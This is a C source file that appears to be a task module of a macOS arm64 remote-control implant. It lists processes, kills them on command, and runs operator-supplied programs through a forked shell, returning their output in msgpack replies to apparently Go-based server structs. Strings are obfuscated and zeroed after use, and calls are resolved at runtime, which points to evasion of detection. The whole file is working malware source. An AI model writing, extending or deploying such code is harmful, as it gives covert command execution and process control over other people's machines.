#include "tasks_proc.h"
#include "crt.h"
#include "dyld_resolve.h"
#include "strings_obf.h"

#include <unistd.h>
#include <signal.h>
#include <sys/sysctl.h>
#include <sys/wait.h>
#include <pwd.h>

#ifdef DEBUG_TRACE
#include "syscalls_arm64.h"
static void _dbg(const char* msg) {
    size_t len = 0;
    const char* p = msg;
    while (*p++) len++;
    sys_write(2, msg, len);
    sys_write(2, "\n", 1);
}
#else
#define _dbg(msg) ((void)0)
#endif

static void write_error(mp_writer_t* w, const char* msg) {
    mp_write_map(w, 1);
    mp_write_kv_str(w, "error", msg);
}

int task_ps(mp_writer_t* w) {
    // Get process list via sysctl(KERN_PROC_ALL)
    int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
    size_t size = 0;

    if (R_sysctl(mib, 4, NULL, &size, NULL, 0) != 0) {
        write_error(w, "sysctl size failed");
        return 0;
    }

    uint8_t* buf = (uint8_t*)ax_malloc(size);
    if (R_sysctl(mib, 4, buf, &size, NULL, 0) != 0) {
        ax_free(buf, size);
        write_error(w, "sysctl data failed");
        return 0;
    }

    uint32_t nprocs = (uint32_t)(size / sizeof(struct kinfo_proc));
    struct kinfo_proc* procs = (struct kinfo_proc*)buf;

    // Build process list
    mp_writer_t proc_writer;
    mp_writer_init(&proc_writer, 4096);
    mp_write_array(&proc_writer, nprocs);

    for (uint32_t i = 0; i < nprocs; i++) {
        struct kinfo_proc* p = &procs[i];

        // Get username from UID
        struct passwd* pw = (struct passwd*)R_getpwuid(p->kp_eproc.e_ucred.cr_uid);
        const char* user = pw ? pw->pw_name : "";

        // TTY name
        char tty[32] = "";
        if (p->kp_eproc.e_tdev != 0 && p->kp_eproc.e_tdev != (dev_t)-1) {
            // Simplified — just show device number
            ax_strcpy(tty, "?");
        }

        // PsInfo map (declaration order from Go struct)
        mp_write_map(&proc_writer, 5);
        mp_write_kv_int(&proc_writer, "pid", p->kp_proc.p_pid);
        mp_write_kv_int(&proc_writer, "ppid", p->kp_eproc.e_ppid);
        mp_write_kv_str(&proc_writer, "tty", tty);
        mp_write_kv_str(&proc_writer, "context", user);
        mp_write_kv_str(&proc_writer, "process", p->kp_proc.p_comm);
    }

    ax_free(buf, size);

    // Response: AnsPs {result, status, processes}
    mp_write_map(w, 3);
    mp_write_kv_bool(w, "result", 1);
    mp_write_kv_str(w, "status", "");
    mp_write_kv_bin(w, "processes", proc_writer.buf.data, (uint32_t)proc_writer.buf.len);

    mp_writer_free(&proc_writer);
    return 0;
}

int task_kill(const uint8_t* data, uint32_t data_len, mp_writer_t* w) {
    // Parse ParamsKill {pid: int}
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) {
        write_error(w, "invalid params");
        return 0;
    }

    int target_pid = 0;
    for (uint32_t i = 0; i < map_count; i++) {
        const char* key; uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) break;
        if (klen == 3 && ax_memcmp(key, "pid", 3) == 0) {
            int64_t v;
            if (mp_read_int(&r, &v) == 0) target_pid = (int)v;
            else { uint64_t u; mp_read_uint(&r, &u); target_pid = (int)u; }
        } else {
            mp_skip(&r);
        }
    }

    if (target_pid <= 0) {
        write_error(w, "invalid pid");
        return 0;
    }

    if (R_kill(target_pid, SIGKILL) != 0) {
        write_error(w, "kill failed");
        return 0;
    }

    mp_write_nil(w);
    return 0;
}

int task_shell(const uint8_t* data, uint32_t data_len, mp_writer_t* w) {
    // Parse ParamsShell {program: string, args: []string}
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) {
        write_error(w, "invalid params");
        return 0;
    }

    DEOBF(default_shell, OBF_ZSH);
    char program[4096];
    ax_strcpy(program, default_shell);
    ZERO_STR(default_shell, OBF_ZSH);
    char** args = NULL;
    uint32_t arg_count = 0;

    for (uint32_t i = 0; i < map_count; i++) {
        const char* key; uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) break;

        if (klen == 7 && ax_memcmp(key, "program", 7) == 0) {
            const char* val; uint32_t vlen;
            if (mp_read_str(&r, &val, &vlen) == 0) {
                if (vlen >= sizeof(program)) vlen = sizeof(program) - 1;
                ax_memcpy(program, val, vlen);
                program[vlen] = '\0';
            }
        } else if (klen == 4 && ax_memcmp(key, "args", 4) == 0) {
            uint32_t arr_count;
            if (mp_read_array(&r, &arr_count) == 0) {
                arg_count = arr_count;
                args = (char**)ax_malloc(arr_count * sizeof(char*));
                for (uint32_t j = 0; j < arr_count; j++) {
                    const char* val; uint32_t vlen;
                    if (mp_read_str(&r, &val, &vlen) == 0) {
                        args[j] = (char*)ax_malloc(vlen + 1);
                        ax_memcpy(args[j], val, vlen);
                        args[j][vlen] = '\0';
                    } else {
                        args[j] = (char*)ax_malloc(1);
                        args[j][0] = '\0';
                    }
                }
            }
        } else {
            mp_skip(&r);
        }
    }

#ifdef DEBUG_TRACE
    {
        _dbg("[SHELL] parsed params:");
        _dbg(program);
        char abuf[64];
        int ai = 0;
        const char* ap = "[SHELL] arg_count=";
        while (*ap) abuf[ai++] = *ap++;
        uint32_t av = arg_count;
        char nb[12]; int ni = 0;
        do { nb[ni++] = '0' + (av % 10); av /= 10; } while (av > 0);
        while (ni > 0) abuf[ai++] = nb[--ni];
        abuf[ai] = '\0';
        _dbg(abuf);
        for (uint32_t j = 0; j < arg_count && j < 4; j++) {
            _dbg(args[j]);
        }
    }
#endif

    // Create pipes for stdout+stderr
    int pipefd[2];
    if (R_pipe(pipefd) != 0) {
        write_error(w, "pipe failed");
        goto cleanup;
    }

    pid_t pid = R_fork();
    if (pid < 0) {
        R_close(pipefd[0]);
        R_close(pipefd[1]);
        write_error(w, "fork failed");
        goto cleanup;
    }

    if (pid == 0) {
        // Child
        R_close(pipefd[0]);
        R_dup2(pipefd[1], STDOUT_FILENO);
        R_dup2(pipefd[1], STDERR_FILENO);
        R_close(pipefd[1]);

        // Build argv: [program, args..., NULL]
        char** argv = (char**)ax_malloc((arg_count + 2) * sizeof(char*));
        argv[0] = program;
        for (uint32_t j = 0; j < arg_count; j++) argv[j + 1] = args[j];
        argv[arg_count + 1] = NULL;

        // Use execve with environ from _NSGetEnviron (execvp may fail with -nostdlib)
        extern char*** _NSGetEnviron(void);
        char** environ = *_NSGetEnviron();
        R_execve(program, argv, environ);
        R_exit(127);
    }

    // Parent
    R_close(pipefd[1]);

    // Read output
    buffer_t output;
    buf_init(&output, 4096);
    char read_buf[4096];
    ssize_t n;
    while ((n = R_read(pipefd[0], read_buf, sizeof(read_buf))) > 0) {
        buf_append(&output, (uint8_t*)read_buf, (size_t)n);
    }
    R_close(pipefd[0]);

    int status;
    R_waitpid(pid, &status, 0);

#ifdef DEBUG_TRACE
    {
        char obuf[80];
        int oi = 0;
        const char* op = "[SHELL] output_len=";
        while (*op) obuf[oi++] = *op++;
        size_t ov = output.len;
        char nb[16]; int ni = 0;
        do { nb[ni++] = '0' + (ov % 10); ov /= 10; } while (ov > 0);
        while (ni > 0) obuf[oi++] = nb[--ni];
        const char* sp = " status=";
        while (*sp) obuf[oi++] = *sp++;
        int sv = WEXITSTATUS(status);
        ni = 0;
        do { nb[ni++] = '0' + (sv % 10); sv /= 10; } while (sv > 0);
        while (ni > 0) obuf[oi++] = nb[--ni];
        obuf[oi] = '\0';
        _dbg(obuf);
    }
#endif

    // Response: AnsShell {output}
    // Null-terminate for safety
    char nul = '\0';
    buf_append(&output, (uint8_t*)&nul, 1);

    mp_write_map(w, 1);
    mp_write_kv_str(w, "output", (const char*)output.data);
    buf_free(&output);

cleanup:
    if (args) {
        for (uint32_t j = 0; j < arg_count; j++) {
            if (args[j]) ax_free(args[j], ax_strlen(args[j]) + 1);
        }
        ax_free(args, arg_count * sizeof(char*));
    }
    return 0;
}
